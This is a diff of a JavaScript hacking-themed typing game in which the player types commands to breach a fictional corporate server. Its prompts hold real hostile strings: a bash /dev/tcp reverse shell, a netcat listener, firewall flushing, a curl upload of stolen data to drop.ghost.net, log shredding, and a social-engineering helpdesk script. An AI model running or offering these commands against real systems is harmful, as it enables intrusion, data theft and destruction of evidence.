-    if(!c.locked)btn.onclick=()=>{hideChoices();setKW('','');tYOU(c.label);c.go();};
+  arr.forEach(function(c){
+    const btn=document.createElement('button');
+    btn.className='choice'+(c.locked?' locked':'');
+    btn.textContent=c.label;
+    if(!c.locked){
+      btn.onclick=function(){
+        hideChoices();
+        tYOU(c.label);
+        enableInput(false);
+        c.go();
+      };
+    }
     el.appendChild(btn);
   });
   el.classList.add('show');
 }
-function hideChoices(){const el=document.getElementById('choices');el.classList.remove('show');el.innerHTML='';}
+function hideChoices(){
+  const el=document.getElementById('choices');
+  el.classList.remove('show');
+  el.innerHTML='';
+}
 
-// ── MINI-GAME ──
+function enableInput(on,hint){
+  cmdInput.disabled=!on;
+  const h=document.getElementById('hint-txt');
+  if(on){
+    h.innerHTML=hint?'CMD: <span>'+hint+'</span>':'AWAITING INPUT';
+    cmdInput.focus();
+  } else {
+    h.textContent='SELECT AN OPTION ABOVE';
+    cmdInput.placeholder='...';
+  }
+}
+
+/* ── COMMAND PROCESSOR ── */
+function processCommand(cmd){
+  // Fuzzy match — strip extra spaces
+  cmd=cmd.replace(/\s+/g,' ').trim();
+
+  if(G.scene==='intro' && cmd==='connect --vpn'){
+    enableInput(false);return sceneVPN();
+  }
+  if(G.scene==='ssh' && (cmd==='ssh analyst@10.0.8.52 -p 2222' || cmd==='ssh analyst@10.0.8.52')){
+    enableInput(false);return sceneSSHIn();
+  }
+  if(G.scene==='vault' && (cmd.startsWith('extract'))){
+    enableInput(false);return sceneExtract();
+  }
+  if(G.scene==='exfil' && (cmd.startsWith('wipe'))){
+    enableInput(false);return sceneExfil();
+  }
+
+  // Unknown command
+  tErr('>> Unknown command: '+cmd);
+  const h=document.getElementById('hint-txt');
+  if(h.querySelector('span')){
+    tSys('Try: '+h.querySelector('span').textContent);
+  }
+}
+
+/* ── MINI-GAME ── */
 function startMG(cfg){
   G.mg={active:true,prompts:cfg.prompts,idx:0,start:Date.now(),timer:null,onDone:cfg.onDone,onFail:cfg.onFail,limit:cfg.limit||50};
   document.getElementById('mg').classList.add('show');
   document.getElementById('mg-title').textContent=cfg.title||'BREACH SEQUENCE';
   document.getElementById('mg-inst').textContent=cfg.inst;
   loadMGP();
-  const inp=document.getElementById('mg-input');inp.value='';inp.className='';inp.oninput=handleMGI;inp.focus();
-  let rem=G.mg.limit;document.getElementById('mg-timer').textContent=rem+'s';
+  const inp=document.getElementById('mg-input');
+  inp.value='';inp.className='';
+  inp.oninput=handleMGI;
+  setTimeout(()=>inp.focus(),100);
+  let rem=G.mg.limit;
+  document.getElementById('mg-timer').textContent=rem+'s';
   G.mg.timer=setInterval(()=>{rem--;document.getElementById('mg-timer').textContent=rem+'s';if(rem<=0){clearInterval(G.mg.timer);endMG(false);}},1000);
 }
 function loadMGP(){
-  const p=G.mg.prompts[G.mg.idx];renderMGP('');
-  document.getElementById('mg-input').value='';document.getElementById('mg-input').className='';
+  renderMGP('');
+  document.getElementById('mg-input').value='';
+  document.getElementById('mg-input').className='';
   document.getElementById('mg-pfill').style.width=(G.mg.idx/G.mg.prompts.length*100)+'%';
 }
 function renderMGP(typed){
-  const t=G.mg.prompts[G.mg.idx];
+  const target=G.mg.prompts[G.mg.idx];
   let h='';
-  for(let i=0;i<t.length;i++){
-    if(i<typed.length)h+=`<span style="color:${typed[i]===t[i]?'var(--green)':'var(--red)'}">${t[i]===' '?'&nbsp;':t[i]}</span>`;
-    else{if(i===typed.length)h+=`<span style="background:var(--green);color:var(--bg);padding:0 1px;">&nbsp;</span>`;h+=`<span style="color:var(--text3)">${t[i]===' '?'&nbsp;':t[i]}</span>`;}
+  for(let i=0;i<target.length;i++){
+    const ch=target[i]===' '?'&nbsp;':target[i];
+    if(i<typed.length){
+      h+='<span style="color:'+(typed[i]===target[i]?'var(--green)':'var(--red)')+'">'+ch+'</span>';
+    } else {
+      if(i===typed.length)h+='<span style="background:var(--green);color:var(--bg);padding:0 1px;">&nbsp;</span>';
+      h+='<span style="color:var(--text3)">'+ch+'</span>';
+    }
   }
   document.getElementById('mg-prompt').innerHTML=h;
 }
 function handleMGI(){
   if(!G.mg.active)return;
-  const inp=document.getElementById('mg-input'),typed=inp.value,target=G.mg.prompts[G.mg.idx];
+  const inp=document.getElementById('mg-input');
+  const typed=inp.value;
+  const target=G.mg.prompts[G.mg.idx];
   renderMGP(typed);
   const mins=(Date.now()-G.mg.start)/60000;
-  if(mins>0.01){const tot=G.mg.prompts.slice(0,G.mg.idx).join('').length+typed.length;document.getElementById('mg-wpm').textContent=`WPM: ${Math.round((tot/5)/mins)}`;}
-  let err=false;for(let i=0;i<typed.length;i++)if(typed[i]!==target[i]){err=true;break;}
+  if(mins>0.01){
+    const tot=G.mg.prompts.slice(0,G.mg.idx).join('').length+typed.length;
+    document.getElementById('mg-wpm-txt').textContent='WPM: '+Math.round((tot/5)/mins);
+  }
+  let err=false;
+  for(let i=0;i<typed.length;i++){if(typed[i]!==target[i]){err=true;break;}}
   inp.className=err?'err':'';
-  if(typed===target){G.mg.idx++;inp.className='ok2';if(G.mg.idx>=G.mg.prompts.length)setTimeout(()=>endMG(true),280);else setTimeout(()=>{inp.value='';inp.className='';loadMGP();},180);}
+  if(typed===target){
+    G.mg.idx++;inp.className='ok2';
+    if(G.mg.idx>=G.mg.prompts.length){setTimeout(()=>endMG(true),280);}
+    else{setTimeout(()=>{inp.value='';inp.className='';loadMGP();},180);}
+  }
 }
 function endMG(ok){
   clearInterval(G.mg.timer);G.mg.active=false;
   document.getElementById('mg').classList.remove('show');
-  ri.focus();
-  if(ok)G.mg.onDone&&G.mg.onDone();else G.mg.onFail&&G.mg.onFail();
+  if(ok&&G.mg.onDone)G.mg.onDone();
+  else if(!ok&&G.mg.onFail)G.mg.onFail();
 }
 
-// ── CMD ROUTER ──
-function onCMD(cmd){
-  if(cmd==='connect --vpn')return sceneVPN();
-  if(G.scene==='ssh'&&cmd==='ssh analyst@10.0.8.52 -p 2222')return sceneSSHIn();
-  if(G.scene==='vault')return sceneExtract();
-  if(G.scene==='farrow')return sceneExfil();
-}
-
-// ══════════════════════════════════════════
-//  SCENES — SHORT & PUNCHY
-// ══════════════════════════════════════════
+/* ══════════════════════════════════════
+   SCENES
+══════════════════════════════════════ */
 
 function sceneIntro(){
   G.scene='intro';setLoc('SECURE CHANNEL');
   tHdr('// OP: BLACKVAULT — BRIEFING');
   tSys('AES-256 ✓  |  Anonymizer: 4-hop ✓  |  Trace: Clean ✓');tBlank();
   tNPC('HANDLER','Target: NovaCorp BLACKVAULT server. Financial ledger, 2.3GB encrypted. Board-level fraud. $400M.');
-  tNPC('HANDLER','Asset left a service port open. Three security layers between you and it. Get in, get out.');tBlank();
-  tSys('Initialize:');
-  setTimeout(()=>setKW('connect --vpn','connect --vpn'),1800);
+  tNPC('HANDLER','Asset left a port open. Three security layers between you and it. Get in, get out.');tBlank();
+  setTimeout(()=>{
+    enableInput(true,'connect --vpn');
+    cmdInput.placeholder='connect --vpn';
+  },1800);
   log('Briefing received','log-ok');
 }
 
@@ -574,35 +618,40 @@ function sceneVPN(){
       {label:'[2] SSH WITH CRACKED CREDS',go:sceneSSH},
       {label:'[3] SOCIAL ENGINEER HELPDESK',go:sceneSocial},
     ]);
+    enableInput(false);
   },1000);
 }
 
 function sceneFTP(){
   setLoc('FTP SERVICE — PORT 21');
   tBlank();tHdr('// EXPLOIT: vsftpd 2.3.4');
-  tNPC('HANDLER','Unpatched since 2011. Classic negligence.');tBlank();
+  tNPC('HANDLER','Unpatched since 2011. Classic negligence. Type the sequence.');tBlank();
   startMG({
     title:'// FTP BACKDOOR',
-    inst:'Execute the exploit. Every character counts.',
+    inst:'Type each command exactly as shown, then press Enter or wait for auto-advance.',
     prompts:['nmap -sV -p 21 192.168.10.5','ftp 192.168.10.5 6200','USER :)','PASS anonymous'],
-    limit:55,
-    onDone:()=>{tOK('>> FTP SHELL OPEN.');setIDS(26);setStat('h',82);notify('FTP exploit: clean','ok');log('vsftpd backdoor','log-ok');activateNode('vault');setTimeout(sceneFirewall,700);},
-    onFail:()=>{tErr('>> DETECTED. IDS flagged.');setIDS(46);setStat('s',62);notify('IDS alert!','bad');setTimeout(sceneFirewall,600);}
+    limit:60,
+    onDone:()=>{tBlank();tOK('>> FTP SHELL OPEN.');setIDS(26);setStat('h',82);notify('FTP exploit: clean','ok');log('vsftpd backdoor','log-ok');activateNode('vault');setTimeout(sceneFirewall,700);},
+    onFail:()=>{tBlank();tErr('>> DETECTED. IDS flagged.');setIDS(46);setStat('s',62);notify('IDS alert!','bad');setTimeout(sceneFirewall,600);}
   });
 }
 
 function sceneSSH(){
   setLoc('SSH ENDPOINT — PORT 2222');
   tBlank();tHdr('// SSH CREDENTIAL ATTACK');
-  tNPC('HANDLER','Hash cracked from leaked keepalive traffic. analyst / Str0ng!Pass2024. Fourteen months unrotated.');tBlank();
-  tSys('Connect:');setKW('ssh analyst@10.0.8.52 -p 2222','ssh analyst@10.0.8.52 -p 2222');
+  tNPC('HANDLER','Hash cracked. analyst / Str0ng!Pass2024. Unrotated for 14 months.');tBlank();
+  tSys('Connect to the endpoint — type the command and press Enter:');tBlank();
   G.scene='ssh';setStat('o',70);log('SSH creds ready','log-ok');
+  setTimeout(()=>{
+    enableInput(true,'ssh analyst@10.0.8.52 -p 2222');
+    cmdInput.placeholder='ssh analyst@10.0.8.52 -p 2222';
+  },1200);
 }
 
 function sceneSSHIn(){
   setLoc('SSH — ANALYST SESSION');
   tBlank();tOK('>> CONNECTED. Welcome, analyst.');
-  tSys('Mapped internal subnet. BLACKVAULT MAC located.');
+  tSys('Internal subnet mapped. BLACKVAULT MAC located.');
   setIDS(19);setStat('h',78);notify('SSH in as analyst','ok');log('SSH session open','log-ok');
   activateNode('vault');setTimeout(sceneFirewall,800);
 }
@@ -610,27 +659,28 @@ function sceneSSHIn(){
 function sceneSocial(){
   setLoc('NOVACORE IT HELPDESK');
   tBlank();tHdr('// SOCIAL ENGINEERING');
-  tNPC('HANDLER','Target: Daniel Marsh, Senior Infrastructure. Outsourced helpdesk. Overworked. Go.');tBlank();
+  tNPC('HANDLER','Target: Daniel Marsh, Senior Infra. Outsourced helpdesk. Overworked. Go.');tBlank();
   tNPC('HELPDESK','NovaCorp IT, this is Kevin.');
-  tNPC('YOU','Daniel Marsh, senior infra. Locked out. Emergency maintenance window in 40 minutes. Need a reset — now.');
-  tNPC('HELPDESK','...employee ID?');
-  tNPC('YOU','N-7741. VP Engineering is on the line with me.');
+  tNPC('YOU','Daniel Marsh — locked out, emergency maintenance window. Need a reset now.');
+  tNPC('HELPDESK','Employee ID?');
+  tNPC('YOU','N-7741. VP Engineering is watching this deployment.');
   tNPC('HELPDESK','Reset pushed. OTP to registered device.');
   tNPC('HANDLER','SIM intercept live. Got it.');tBlank();
   tOK('>> CREDENTIALS OBTAINED.');
   setStat('o',88);setIDS(15);notify('Social eng: success','ok');log('Helpdesk creds obtained','log-ok');
-  activateNode('vault');setTimeout(sceneFirewall,1200);
+  activateNode('vault');setTimeout(sceneFirewall,1400);
 }
 
 function sceneFirewall(){
   setLoc('BLACKVAULT PERIMETER');
   tBlank();tHdr('// CUSTOM FIREWALL — LAYER 2');
-  tNPC('HANDLER','Stateful DPI. Custom-built. Two options: stealth packet — surgical, low noise. Brute-force — fast, loud.');tBlank();
+  tNPC('HANDLER','Stateful DPI. Custom-built. Stealth packet = surgical, low noise. Brute-force = fast, loud.');tBlank();
   setTimeout(()=>{
     showChoices([
-      {label:'[A] STEALTH PACKET INJECTION',go:sceneStealth},
-      {label:'[B] BRUTE-FORCE RULESET',go:sceneBrute},
+      {label:'[A] STEALTH PACKET INJECTION — low heat',go:sceneStealth},
+      {label:'[B] BRUTE-FORCE RULESET — high heat',go:sceneBrute},
     ]);
+    enableInput(false);
   },900);
 }
 
@@ -639,37 +689,39 @@ function sceneStealth(){
   tBlank();tHdr('// STEALTH BYPASS');
   startMG({
     title:'// PACKET FORGE',
-    inst:'Craft the bypass payload. DPI engine is live.',
+    inst:'Craft the bypass payload. Type each line exactly.',
     prompts:['tcpdump -i eth0 -w cap.pcap','python3 forge.py --dst 10.10.5.20','scapy> send(IP(dst="10.10.5.20")/TCP(dport=443))','./bypass.sh --stealth --port 443'],
     limit:65,
-    onDone:()=>{tOK('>> FIREWALL BYPASSED. DPI: no anomaly.');setStat('s',96);setStat('h',88);setIDS(28);notify('Stealth bypass: clean','ok');log('Firewall bypassed','log-ok');activateNode('vault');setTimeout(sceneVault,700);},
-    onFail:()=>{tErr('>> FAILED. Escalating...');setIDS(52);setStat('s',55);notify('Stealth failed','warn');setTimeout(sceneBrute,500);}
+    onDone:()=>{tBlank();tOK('>> FIREWALL BYPASSED. DPI: no anomaly.');setStat('s',96);setStat('h',88);setIDS(28);notify('Stealth bypass: clean','ok');log('Firewall bypassed','log-ok');activateNode('vault');setTimeout(sceneVault,700);},
+    onFail:()=>{tBlank();tErr('>> FAILED. Escalating...');setIDS(52);setStat('s',55);notify('Stealth failed','warn');setTimeout(sceneBrute,500);}
   });
 }
 
 function sceneBrute(){
   setLoc('BRUTE-FORCE — FIREWALL');
   tBlank();tHdr('// BRUTE-FORCE RULESET');
-  tWarn('HIGH NOISE. NOC will see spikes.');tBlank();
+  tWarn('HIGH NOISE. NOC will see spikes. Move fast.');tBlank();
   startMG({
     title:'// BRUTE-FORCE',
-    inst:'Move fast. They will notice.',
+    inst:'Speed is survival. Type each line exactly.',
     prompts:['nmap --script firewall-bypass 10.10.5.20','iptables -F && iptables -P INPUT ACCEPT','nc -lvnp 4444 &','bash -i >& /dev/tcp/10.10.5.20/4444 0>&1'],
     limit:35,
-    onDone:()=>{tOK('>> FIREWALL CRACKED. Shell obtained.');setIDS(65);setStat('s',42);setStat('h',92);notify('Cracked — HIGH HEAT','bad');log('Brute-force: cracked','log-wn');setTimeout(sceneVault,700);},
-    onFail:()=>{tErr('>> INCOMPLETE. Partial access.');setIDS(80);setStat('s',25);notify('NOC responding!','bad');setTimeout(sceneVault,500);}
+    onDone:()=>{tBlank();tOK('>> CRACKED. Shell obtained.');setIDS(65);setStat('s',42);setStat('h',92);notify('Cracked — HIGH HEAT','bad');log('Brute-force: cracked','log-wn');setTimeout(sceneVault,700);},
+    onFail:()=>{tBlank();tErr('>> INCOMPLETE. Partial access.');setIDS(80);setStat('s',25);notify('NOC responding!','bad');setTimeout(sceneVault,500);}
   });
 }
 
 function sceneVault(){
   setLoc('BLACKVAULT — INTERNAL');
   tBlank();tHdr('// BLACKVAULT ACCESS CONFIRMED');
-  tNPC('HANDLER','I see it. NovaCorp_Ledger_2024_Q3.enc — 2.3GB. Decryption key on separate KMS box.');
-  tNPC('HANDLER','Security team just ran a manual sweep. Eight minutes. Maybe less.');tBlank();
-  tSys('Begin extraction:');
-  setKW('extract --vault --out /drop/','extract --vault');
+  tNPC('HANDLER','NovaCorp_Ledger_2024_Q3.enc — 2.3GB. Decryption key on separate KMS.');
+  tNPC('HANDLER','Security team running a sweep. Eight minutes. Go.');tBlank();
   G.scene='vault';log('BLACKVAULT accessed','log-ok');
   activateNode('vault');
+  setTimeout(()=>{
+    enableInput(true,'extract --vault --out /drop/');
+    cmdInput.placeholder='extract --vault --out /drop/';
+  },1500);
 }
 
 function sceneExtract(){
@@ -677,23 +729,24 @@ function sceneExtract(){
   tBlank();tHdr('// EXTRACTION SEQUENCE');
   tSys('KMS contacted. Decryption key retrieved.');tBlank();
   startMG({
-    title:'// EXTRACT & EXFIL',
-    inst:'Package and deliver. Security team is converging.',
+    title:'// EXTRACT & PACKAGE',
+    inst:'Package and deliver before the server gets isolated. Type each line exactly.',
     prompts:['scp ghost@10.10.5.20:/vault/ledger.enc ./','openssl enc -d -aes-256-cbc -in ledger.enc -out ledger.csv','tar -czf payload.tar.gz ledger.csv','curl -X POST --data-binary @payload.tar.gz https://drop.ghost.net/rx'],
     limit:50,
-    onDone:()=>{tOK('>> PAYLOAD DELIVERED. Integrity verified.');setStat('h',100);setIDS(Math.min(100,G.ids+12));notify('Data extracted!','ok');log('Ledger exfiltrated','log-ok');activateNode('exfil');setTimeout(sceneExfilPrep,800);},
-    onFail:()=>{tErr('>> PARTIAL. Server isolating...');setIDS(85);setStat('s',18);notify('Partial extraction','warn');setTimeout(sceneExfilPrep,600);}
+    onDone:()=>{tBlank();tOK('>> PAYLOAD DELIVERED. Integrity verified.');setStat('h',100);setIDS(Math.min(100,G.ids+12));notify('Data extracted!','ok');log('Ledger exfiltrated','log-ok');activateNode('exfil');setTimeout(sceneExfilPrep,800);},
+    onFail:()=>{tBlank();tErr('>> PARTIAL. Server isolating...');setIDS(85);setStat('s',18);notify('Partial extraction','warn');setTimeout(sceneExfilPrep,600);}
   });
 }
 
 function sceneExfilPrep(){
   setLoc('ANTI-FORENSICS');
   tBlank();tHdr('// COVER YOUR TRACKS');
-  tNPC('HANDLER','Forensics team in six hours. Leave nothing. Not a packet.');tBlank();
-  tSys('Type to begin cleanup:');
-  const kw='wipe --logs --sessions --routes';
-  setKW(kw,'wipe --logs');
-  G.scene='farrow';
+  tNPC('HANDLER','Forensics in six hours. Leave nothing.');tBlank();
+  G.scene='exfil';
+  setTimeout(()=>{
+    enableInput(true,'wipe --logs --sessions --routes');
+    cmdInput.placeholder='wipe --logs --sessions --routes';
+  },1200);
 }
 
 function sceneExfil(){
@@ -701,23 +754,22 @@ function sceneExfil(){
   tBlank();
   startMG({
     title:'// ANTI-FORENSICS',
-    inst:'Erase every trace. Logs, sessions, routes.',
+    inst:'Erase every trace. Type each line exactly.',
     prompts:['history -c && cat /dev/null > ~/.bash_history','find /var/log -type f -exec shred -vzu {} \\;','ip route flush table main && iptables -F','shutdown -h +0'],
     limit:45,
-    onDone:()=>{tOK('>> ALL TRACES WIPED. TUNNEL COLLAPSED.');setIDS(4);setStat('s',100);notify('Clean exit','ok');log('Traces removed','log-ok');NODES.forEach(n=>n.st='done');renderNodes();setTimeout(sceneEnd,900);},
-    onFail:()=>{tWarn('>> PARTIAL CLEANUP. Artifacts remain.');setIDS(35);notify('Logs partially wiped','warn');setTimeout(sceneEnd,600);}
+    onDone:()=>{tBlank();tOK('>> ALL TRACES WIPED. TUNNEL COLLAPSED.');setIDS(4);setStat('s',100);notify('Clean exit','ok');log('Traces removed','log-ok');NODES.forEach(n=>n.st='done');renderNodes();setTimeout(sceneEnd,900);},
+    onFail:()=>{tBlank();tWarn('>> PARTIAL CLEANUP. Artifacts remain.');setIDS(35);notify('Logs partially wiped','warn');setTimeout(sceneEnd,600);}
   });
 }
 
 function sceneEnd(){
   tBlank();tDiv();tHdr('// OPERATION: BLACKVAULT — COMPLETE');tDiv();tBlank();
   tNPC('HANDLER','Ledger is live. Three arrests overnight. CFO in the wind.');
-  tNPC('HANDLER','Payment cleared across six wallets. Clean work, GHOST.');
-  tNPC('YOU','I was never here.');tBlank();
-  tOK('>> MISSION COMPLETE');tDiv();
-  const mins=G.wpm.start?(Date.now()-G.wpm.start)/60000:0;
-  const wpm=mins>0.01?Math.round((G.wpm.chars/5)/mins):0;
+  tNPC('HANDLER','Payment cleared. Clean work, GHOST.');
+  tNPC('YOU','I was never here.');tBlank();tOK('>> MISSION COMPLETE');tDiv();
   log('Op BLACKVAULT: SUCCESS','log-ok');
+  const mins=G.wpmStart?(Date.now()-G.wpmStart)/60000:0;
+  const wpm=mins>0.01?Math.round((G.wpmChars/5)/mins):0;
   setTimeout(()=>{
     document.getElementById('end-title').textContent='MISSION COMPLETE';
     document.getElementById('end-title').className='end-title win';
@@ -726,20 +778,17 @@ function sceneEnd(){
     document.getElementById('e-ids').textContent=G.peakIds+'%';
     document.getElementById('e-st').textContent=G.stats.s;
     showScreen('s-end');
-  },2000);
+  },2500);
 }
 
-// ── INIT ──
+/* ── INIT ── */
 function initGame(){
   showScreen('s-game');
   renderNodes();
+  enableInput(false);
   sceneIntro();
   log('System initialized','log-ok');
   log('Target: NovaCorp BLACKVAULT','log-m');
-  ri.focus();
-  setTimeout(()=>ri.focus(),200);
-  setTimeout(()=>ri.focus(),600);
-  setTimeout(()=>ri.focus(),1500);
 }
 
 function showScreen(id){
